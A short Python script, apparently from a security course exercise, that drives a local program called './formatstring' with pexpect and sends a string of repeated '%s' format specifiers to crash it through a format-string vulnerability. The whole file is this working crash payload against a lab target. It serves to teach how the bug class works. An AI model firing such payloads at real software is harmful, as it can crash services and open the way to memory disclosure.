# Example of how to crash the program for Task 1 (i)
# Uses multiple '%s' to increase likelyhood of printf() trying
# to read from invalid memory address (Restricted, Null, etc...)

from __future__ import print_function

import struct
import pexpect

input1 = '12345'  # Decimal Input
input2 = '%s%s%s%s%s%s%s%s%s%s'   # String input (vulnerability)

# Executable that will be attacked
targetfile = './formatstring'

echo = '' # Return from code
p = pexpect.spawn(targetfile)

# Echo initial output
for i in range(0,5):
	echo = p.readline()
	print(echo, end='')
# Send first user input
print('> Sending: ' + input1)
p.sendline(input1)

# Echo program return
for i in range(0,2):
	echo = p.readline()
	print(echo,end='')

# Send second user input
print('> Sending: ' + input2)
p.sendline(input2)

# Echo program return
for i in range(0,5):
	echo = p.readline()
	print(echo,end='')
	if not echo:
		print('No return from program - it crashed!')
		break
